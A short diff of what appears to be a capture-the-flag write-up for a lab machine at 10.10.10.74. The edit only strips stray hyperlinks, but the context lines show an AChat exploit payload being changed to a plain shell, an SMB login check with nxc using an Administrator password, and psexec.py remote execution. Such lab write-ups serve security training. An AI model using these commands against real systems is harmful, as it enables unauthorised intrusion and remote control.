@@ -105,7 +105,7 @@ I got a connection back:
 I was just losing my shell, so I decided to look at the bash script internals, I saw it is using meterpreter shell, so let’s change it to general shell.
 
 ```bash
-cp AChat_Payload.sh [payload.sh](http://payload.sh/)
+cp AChat_Payload.sh payload.sh
 ```
 
 ```bash
@@ -178,7 +178,7 @@ sudo nxc smb $IP -u Administrator -d . -p Welcome1!
 
 And it works !
 
-Use [psexec.py](http://psexec.py)  to authenticate:
+Use psexec.py  to authenticate:
 
 ```bash
 psexec.py Administrator:'Welcome1!'@10.10.10.74
